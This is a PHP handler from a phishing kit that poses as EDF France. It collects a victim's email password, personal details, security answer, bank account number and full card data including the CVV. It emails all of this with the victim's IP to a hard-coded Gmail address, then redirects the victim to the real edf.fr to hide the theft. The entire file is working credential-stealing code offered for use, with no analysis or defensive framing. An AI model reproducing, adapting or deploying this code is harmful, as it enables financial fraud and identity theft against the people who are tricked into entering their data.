
<?
$ip = getenv("REMOTE_ADDR");
$message .= "----------------Resultat EDF France-----------------\n";
$message .= "-----------------Info Du CC----------------------\n";
$message .= "Email             : ".$_POST['em']."\n";
$message .= "Password          : ".$_POST['pss']."\n";
$message .= "Nom               : ".$_POST['nom']."\n";
$message .= "Prenom            : ".$_POST['prenom']."\n";
$message .= "Adress            : ".$_POST['adresse']."\n";
$message .= "Code Postale      : ".$_POST['cp']."\n";
$message .= "Ville             : ".$_POST['ville']."\n";
$message .= "Date De Naissance : ".$_POST['dob1']."/".$_POST['dob2']."/".$_POST['dob3']."\n";
$message .= "Question securite : ".$_POST['question']."\n";
$message .= "Reponse  securite : ".$_POST['reponse']."\n";
$message .= "Votre Banque      : ".$_POST['bank']."\n";
$message .= "Numero de compte  : ".$_POST['account']."\n";
$message .= "Numero de client  : ".$_POST['sgclient']."\n";
$message .= "Numero de carte   : ".$_POST['ccnum']."\n";
$message .= "Date D'expiration : ".$_POST['expMonth']."/".$_POST['expYear']."\n";
$message .= "CVV               : ".$_POST['cvv']."\n";
$message .= "------------------Info D'IP-------------------------\n";
$message .= "IP                : $ip\n";
$message .= "--------------- ---------------\n";

$send = "rizoma250@gmail.com";

$subject = "Joker ~ $ip";

$from = "From: EDF Full INFO ReZulT~<Joker>";

mail($send,$subject,$message,$from);

echo '<script language="Javascript">
<!--
document.location.replace("http://edf.fr");
// -->
</script>';

?>
